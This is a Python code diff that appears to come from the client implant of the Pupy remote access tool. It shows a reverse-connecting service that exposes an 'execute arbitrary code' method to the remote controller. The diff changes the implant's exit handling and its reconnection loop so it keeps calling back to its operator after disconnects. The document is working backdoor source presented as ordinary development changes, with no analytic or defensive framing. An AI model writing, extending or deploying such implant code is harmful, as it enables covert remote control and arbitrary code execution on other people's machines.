@@ -38,7 +38,7 @@ class ReverseSlaveService(Service):
 			allow_setattr = True,
 			allow_delattr = True,
 			import_custom_exceptions = False,
-			propagate_SystemExit_locally=False,
+			propagate_SystemExit_locally=True,
 			propagate_KeyboardInterrupt_locally=True,
 			instantiate_custom_exceptions = True,
 			instantiate_oldstyle_exceptions = True,
@@ -46,8 +46,13 @@ class ReverseSlaveService(Service):
 		# shortcuts
 		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
 
-	def exposed_exit(self):
+	def on_disconnect(self):
+		print "disconnecting !"
 		raise KeyboardInterrupt
+
+	def exposed_exit(self):
+		raise SystemExit
+
 	def exposed_execute(self, text):
 		"""execute arbitrary code (using ``exec``)"""
 		execute(text, self.exposed_namespace)
@@ -61,15 +66,14 @@ class ReverseSlaveService(Service):
 		"""returns the local connection instance to the other side"""
 		return self._conn
 
-
 def get_next_wait(attempt):
-	return 0.5
 	if attempt<60:
 		return 0.5
 	else:
 		return random.randint(15,30)
 
 def add_pseudo_pupy_module(HOST):
+	""" add a pseudo pupy module for *nix payloads """
 	if not "pupy" in sys.modules:
 		mod = imp.new_module("pupy")
 		mod.__name__="pupy"
@@ -108,7 +112,9 @@ def main():
 				attempt=0
 				conn.serve()
 		except KeyboardInterrupt:
-			print "keyboard interrupt received !"
+			print "keyboard interrupt raised, restarting the connection"
+		except SystemExit:
+			print "SystemExit raised"
 			break
 		except Exception as e:
 			time.sleep(get_next_wait(attempt))
